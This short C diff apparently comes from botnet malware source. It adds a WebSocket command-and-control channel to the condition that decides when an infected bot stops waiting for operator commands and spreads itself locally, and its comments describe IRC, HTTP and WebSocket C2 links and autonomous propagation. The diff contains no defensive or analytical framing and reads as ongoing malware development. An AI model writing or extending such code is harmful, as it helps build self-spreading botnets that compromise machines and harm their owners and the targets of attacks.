@@ -393,8 +393,11 @@ int main(void) {
         /* Spread if not connected to primary C2. The gate is the LIVE
          * connection state, not the config-enabled bitmask: a bot whose
          * C2 is down (or disabled) falls back to autonomous spreading,
-         * while a connected bot waits for operator commands (#95). */
-        if (!g_bot.c2_irc.connected && !g_bot.c2_http.connected) {
+         * while a connected bot waits for operator commands (#95).
+         * (#106): a WS-connected bot is equally operator-attached — a
+         * connected bot on ANY channel must not run spread_local. */
+        if (!g_bot.c2_irc.connected && !g_bot.c2_http.connected &&
+            !g_bot.c2_ws.connected) {
             log_info("Primary C2 unavailable, spreading locally");
             spread_local(&g_bot);
         }
